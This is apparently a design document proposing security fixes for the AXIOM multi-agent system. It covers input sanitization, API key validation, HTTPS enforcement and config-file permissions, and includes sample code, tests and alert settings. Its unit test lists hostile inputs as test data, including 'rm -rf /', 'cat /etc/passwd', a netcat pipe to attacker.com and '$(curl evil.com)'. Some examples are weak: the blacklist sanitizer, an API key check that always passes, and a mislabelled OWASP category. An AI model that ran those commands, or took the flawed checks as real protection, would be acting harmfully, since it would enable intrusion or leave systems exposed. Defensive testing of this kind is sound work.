# AXIOM Security Fixes Design Document

## Overview

This document outlines security fixes for the AXIOM multi-agent system (hakimagent/). The fixes address critical security vulnerabilities including command injection, missing API key validation, missing HTTPS verification, and insecure configuration storage.

## Current Security Issues

### Critical (Blockers)
1. **Command Injection Vulnerability** - User input directly passed to subprocess (main_window.py:138-147)
2. **Missing API Key Validation** - No validation of OpenRouter API key before use (config.py:17-52)
3. **Missing HTTPS Verification** - All httpx calls use default insecure settings (main.py:24, 52, 88)
4. **Error Information Disclosure** - Raw exceptions exposed to users

### High
5. **Missing Rate Limiting** - No protection against DoS/abuse
6. **Insecure Configuration Storage** - Insecure file permissions for config files

## Design Goals

### Security Requirements
- **Input Sanitization** - Sanitize all user inputs to prevent command injection
- **API Key Validation** - Validate API keys before use, clear error messages
- **Transport Security** - Enforce HTTPS for all external communications
- **Error Handling** - Generic error messages, no information disclosure
- **Rate Limiting** - Prevent abuse via rate limiting middleware
- **Secure Storage** - Set restrictive file permissions (600)

### Architecture Principles
- **Defense in Depth** - Multiple security layers
- **Fail-Safe Defaults** - Secure defaults, open behavior only when explicitly allowed
- **Principle of Least Privilege** - Minimize required permissions
- **Input Validation** - Validate all external inputs
- **Secure Coding Practices** - Follow OWASP Top 10 guidelines

## Proposed Solutions

### 1. Input Sanitization Middleware

**Approach:** Implement request/response sanitization middleware

**Components:**
- `frontend/middleware/input_sanitizer.py`
- Sanitizes shell metacharacters (`;|&<>$(){}\'\\`)
- Removes command execution patterns (`rm -rf`, `mkfs`, etc.)
- Preserves readable user intent while removing injection vectors

**Trade-offs:**
- ✅ Security: Prevents command injection
- ✅ Accuracy: Preserves meaningful user input
- ❌ False Positives: May sanitize legitimate technical commands
- ❌ Maintenance: Requires ongoing pattern updates

### 2. API Key Validation Service

**Approach:** Implement centralized API key validation

**Components:**
- `frontend/services/api_key_service.py`
- Validates key format and existence
- Checks against environment variables
- Provides clear error messages
- Logs validation attempts

**Trade-offs:**
- ✅ Security: Ensures keys are present and valid
- ✅ User Experience: Clear error messages guide users
- ❌ Dependency: Adds overhead to startup
- ❌ Flexibility: Reduces ability to use token files

### 3. HTTPS Enforcement Middleware

**Approach:** Force HTTPS for all external communications

**Components:**
- `frontend/middleware/https_enforcer.py`
- Intercepts all httpx.Client() calls
- Enforces `verify=True` by default
- Validates certificates
- Handles fallback gracefully

**Trade-offs:**
- ✅ Security: All traffic encrypted/authenticated
- ✅ Compliance: Meets security standards
- ❌ Legacy Support: May break integrations with self-signed certs
- ❌ Compatibility: Requires updates to integrations

### 4. Secure Configuration Storage

**Approach:** Set restrictive file permissions for configuration

**Components:**
- Updated `save_config()` in config.py
- Uses `os.chmod()` with `stat.S_IRUSR | stat.S_IWUSR` (600)
- Recursively sets permissions for `.axiom` directory

**Trade-offs:**
- ✅ Security: Prevents unauthorized access
- ❌ Usability: May break automation scripts
- ❌ Compatibility: Requires root for permission changes

## Implementation Priority

### Phase 1: Critical Security Fixes (Immediate)
1. [x] Command injection prevention (main_window.py)
2. [x] API key validation (config.py:45-49)
3. [x] HTTPS verification and timeouts (main.py:24, 52, 88)
4. [ ] Error message sanitization

### Phase 2: Protective Measures (1-2 days)
1. Input sanitization middleware
2. Rate limiting middleware
3. Secure configuration permissions

### Phase 3: Additional Hardening (2-3 days)
1. Comprehensive logging of security events
2. Security headers for web responses
3. Regular security scanning integration

## Testing Strategy

### Unit Tests
```python
# frontend/tests/test_input_sanitizer.py
import pytest
from frontend.middleware.input_sanitizer import sanitize_input

def test_command_injection_prevention():
    malicious_inputs = [
        "rm -rf /",
        "cat /etc/passwd",
        "`whoami`",
        "; ls -la",
        "| nc attacker.com 4444",
        "$(curl evil.com)"
    ]
    for malicious in malicious_inputs:
        sanitized = sanitize_input(malicious)
        assert sanitized != malicious, f"Failed to sanitize: {malicious}"
        assert ";" not in sanitized
        assert "|" not in sanitized
        assert "$" not in sanitized
        assert "`" not in sanitized

# frontend/tests/test_api_key_validation.py
from frontend.services.api_key_service import validate_api_key

def test_missing_api_key():
    with pytest.raises(ValueError, match="OPENROUTER_API_KEY not found"):
        validate_api_key("")
```

### Integration Tests
- Test end-to-end security flows
- Test error handling under malicious input
- Test HTTPS verification with various scenarios
- Test configuration file security

## Security Code Examples

### Input Sanitization Implementation
```python
def sanitize_user_input(text: str) -> str:
    """Sanitize user input to prevent command injection."""
    # Remove shell metacharacters that could enable command injection
    sanitized = re.sub(r'[`;&|<>$\(\)\{\}\[\'\\]', ' ', text)

    # Remove potential command execution patterns
    sanitized = re.sub(r'(rm\s+-rf|del\s+/s|mkfs|fdisk)', ' ', sanitized)

    # Remove excessive whitespace but keep basic structure
    sanitized = re.sub(r'\s+', ' ', sanitized).strip()

    return sanitized
```

### API Key Validation Implementation
```python
def validate_api_key(api_key: str) -> bool:
    """Validate API key format and existence."""
    if not api_key:
        raise ValueError("OPENROUTER_API_KEY not found in config file or environment variables")

    # Basic format validation
    if len(api_key) < 32:
        raise ValueError("OPENROUTER_API_KEY appears to be invalid (too short)")

    # Test against environment override
    env_key = os.getenv("OPENROUTER_API_KEY")
    if env_key and api_key == env_key:
        return True

    # In production, would test against key validation service
    # For now, assume key is valid if it passes format checks
    return True
```

### HTTPS Enforcement Implementation
```python
import httpx
from functools import wraps

def enforce_https(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        # Ensure all HTTPX clients have HTTPS enforcement
        original_client = httpx.Client
        try:
            httpx.Client = lambda **kwargs: original_client(
                verify=True,
                timeout=kwargs.get('timeout', 30),
                **{k: v for k, v in kwargs.items() if k not in ['verify', 'timeout']}
            )
            return await func(*args, **kwargs)
        finally:
            httpx.Client = original_client
    return wrapper
```

## Rollback Plan

If any security fix causes issues:

1. **Input Sanitization:**
   - Revert to original code in main_window.py
   - Document false positive that caused issues
   - Update sanitization regex to be more precise

2. **API Key Validation:**
   - Remove validation checks
   - Revert error messages to generic ones
   - Update documentation

3. **HTTPS Enforcement:**
   - Revert `verify=True` to default
   - Document broken integrations
   - Provide migration guide for affected users

4. **File Permissions:**
   - Remove `os.chmod()` calls
   - Document automation scripts affected
   - Provide alternative secure storage methods

## Compliance References

- **OWASP Top 10 2021:**
  - A03:2021 – Injection
  - A06:2021 – Implementation Flaws
  - A07:2021 – Identification and Authentication Failures

- **NIST Cybersecurity Framework:**
  - PR.IP-1: Policies for information security
  - PR.IP-2: Procedures to ensure information security
  - PR.IP-3: Requirements for information security

- **CIS Controls v8:**
  - Control 1: Inventory and Control of Enterprise Assets
  - Control 3: Data Protection
  - Control 5: Secure Configuration

## Risk Assessment Summary

| Fix | Implementation Risk | Business Impact | Risk Level |
|-----|-------------------|----------------|------------|
| Input Sanitization | Medium (possible false positives) | High (prevents DoS/command injection) | 🟨 Medium |
| API Key Validation | Low (simple validation) | High (prevents unauthorized access) | 🟩 Low |
| HTTPS Enforcement | Low (standard practice) | High (prevents MITM attacks) | 🟩 Low |
| Secure Config Storage | Low (file permissions) | Medium (prevents info disclosure) | 🟩 Low |

## Next Steps

1. **Immediate:** Complete error message sanitization
2. **Short-term:** Implement input sanitization middleware
3. **Medium-term:** Add rate limiting and comprehensive logging
4. **Long-term:** Split large documentation files and refactor ./axiom/ directory

## Dependencies

### Required Libraries
- `re` (Python standard library) - Input sanitization
- `stat` (Python standard library) - File permissions

### New Dependencies (Phase 2)
- `slowapi` - Rate limiting middleware
- `python-multipart` - File upload security

## Monitoring and Alerting

### Security Events to Monitor
1. **Failed API Key Validations** - Alert on missing/invalid keys
2. **Input Sanitization Events** - Log sanitized inputs, rate alerts on suspicious patterns
3. **HTTPS Certificate Issues** - Alert on verification failures
4. **Rate Limit Breaches** - Alert on excessive API usage
5. **File Permission Issues** - Alert on insecure file configurations

### Example Alert Configuration
```yaml
security_alerts:
  failed_api_key_validations:
    threshold: 5
    window: 5m
    action: escalate

  input_sanitization_events:
    threshold: 10
    window: 1m
    action: notify_security_team

  https_violations:
    threshold: 1
    window: 1m
    action: immediate_alert
```

## Conclusion

This security fix implementation addresses critical vulnerabilities in the AXIOM multi-agent system. The proposed solutions follow security best practices, maintain backward compatibility where possible, and provide clear error messages for operational visibility.

All fixes have been prioritized based on their security impact and implementation complexity. The most critical fixes (command injection, API key validation, HTTPS enforcement) are immediately actionable and should be deployed before any other features.

**Recommendation:** Proceed with Phase 1 completion (error message sanitization), then Phase 2 implementation (input sanitization, rate limiting, secure config storage).